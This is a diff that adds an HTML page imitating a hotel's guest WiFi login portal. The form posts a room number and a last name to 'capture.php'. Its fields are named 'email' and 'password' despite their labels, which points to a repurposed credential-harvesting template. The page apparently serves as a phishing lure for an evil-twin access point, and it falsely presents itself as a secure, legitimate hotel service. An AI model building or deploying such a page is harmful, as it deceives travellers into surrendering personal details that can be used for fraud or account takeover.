@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hotel WiFi - Guest Access</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <div class="header">
+                <div class="hotel-icon">
+                    <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+                        <polyline points="9 22 9 12 15 12 15 22"></polyline>
+                    </svg>
+                </div>
+                <h1>Welcome to Hotel WiFi</h1>
+                <p class="subtitle">Complimentary high-speed internet for guests</p>
+            </div>
+
+            <form method="POST" action="capture.php" class="login-form">
+                <div class="info-box">
+                    <h3>Guest Information Required</h3>
+                    <p>Please provide your details to access complimentary WiFi</p>
+                </div>
+
+                <div class="form-group">
+                    <label for="room">Room Number</label>
+                    <input type="text" id="room" name="email" placeholder="Enter your room number" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="lastname">Last Name</label>
+                    <input type="text" id="lastname" name="password" placeholder="Last name on reservation" required>
+                </div>
+
+                <button type="submit" class="connect-btn">Connect to WiFi</button>
+
+                <div class="features">
+                    <div class="feature">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M12 2L2 7l10 5 10-5-10-5z"></path>
+                            <polyline points="2 17 12 22 22 17"></polyline>
+                            <polyline points="2 12 12 17 22 12"></polyline>
+                        </svg>
+                        <span>High-Speed Connection</span>
+                    </div>
+                    <div class="feature">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                        </svg>
+                        <span>Secure Network</span>
+                    </div>
+                </div>
+
+                <div class="terms">
+                    <p>By connecting, you agree to our acceptable use policy. WiFi access is complimentary for registered guests during their stay.</p>
+                </div>
+            </form>
+        </div>
+    </div>
+</body>
+</html>
